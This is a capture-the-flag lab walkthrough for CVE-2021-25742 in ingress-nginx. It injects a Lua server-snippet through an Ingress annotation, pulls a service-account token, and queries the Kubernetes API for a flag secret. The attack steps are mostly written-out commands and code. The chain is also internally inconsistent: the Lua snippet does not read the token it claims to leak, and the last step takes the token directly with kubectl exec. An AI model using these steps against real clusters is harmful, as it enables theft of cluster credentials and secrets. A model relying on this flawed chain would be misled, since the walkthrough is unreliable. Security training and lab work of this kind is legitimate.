# K8S-21: ingress-nginx Lua Snippet Secret Extraction

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-21 |
| 名称 | ingress-nginx Lua Snippet Secret Extraction |
| 技术/CVE | CVE-2021-25742 |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | localhost:10480 |
| 集群 | cve-k8s-21-ingress-snippet |
| 镜像 | kindest/node:v1.27.3 |
| 攻击面 | Ingress annotation injection → SA token theft → Secret access |

## 场景概述

```
kubectl access → Modify Ingress server-snippet annotation
  → Inject Lua code to read SA token from filesystem
  → Use SA token to call K8s API → Read flag-secret
```

## 前置知识

- kubectl access to KIND cluster `cve-k8s-21-ingress-snippet`
- ingress-nginx 允许通过 Ingress annotation 注入 server-snippet（CVE-2021-25742）

## 利用步骤

### Step 1: Identify Vulnerable Ingress

```bash
kubectl get ingress snippet-app -o yaml
# Note the server-snippet annotation is enabled
```

### Step 2: Modify Ingress with Malicious Snippet

```bash
kubectl annotate ingress snippet-app \
  nginx.ingress.kubernetes.io/server-snippet='
  local sock = ngx.socket.tcp()
  sock:connect("127.0.0.1", 80)
  local req = "GET /secret HTTP/1.1\r\nHost: localhost\r\n\r\n"
  sock:send(req)
  local resp = sock:receive("*a")
  ngx.log(ngx.ERR, "SECRET_RESP: " .. resp)
  '
```

### Step 3: Trigger Request and Extract Token

```bash
curl -H "Host: demo.local" http://localhost:10480/
# Check ingress-nginx controller logs for the SA token
kubectl logs -n ingress-nginx deployment/ingress-nginx-controller | grep ERROR
```

### Step 4: Use Token to Read Flag Secret

```bash
TOKEN=$(kubectl exec -n ingress-nginx <controller-pod> -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/secrets/flag-secret
# Base64 decode the flag from the response
```

## 验证命令

```bash
cd cve_challenges/scenarios/k8s/ingress-snippet && bash deploy.sh
kubectl get secret flag-secret -o jsonpath='{.data.flag}' | base64 -d
bash teardown.sh
```

## Flag

- **Primary**: Kubernetes Secret `flag-secret` in `default` namespace
- **Format**: `flag{k8s-21-<16-hex>}`

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | ingress-nginx annotations and Lua snippets |
| 侦察与前置条件 | Ingress snippet policy and controller-mounted secret locations |
| 核心漏洞与利用 | Inject a Lua snippet into an Ingress |
| 权限、横向或影响 | Controller secret disclosure |
| 验证 | Return/read the secret containing the flag |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
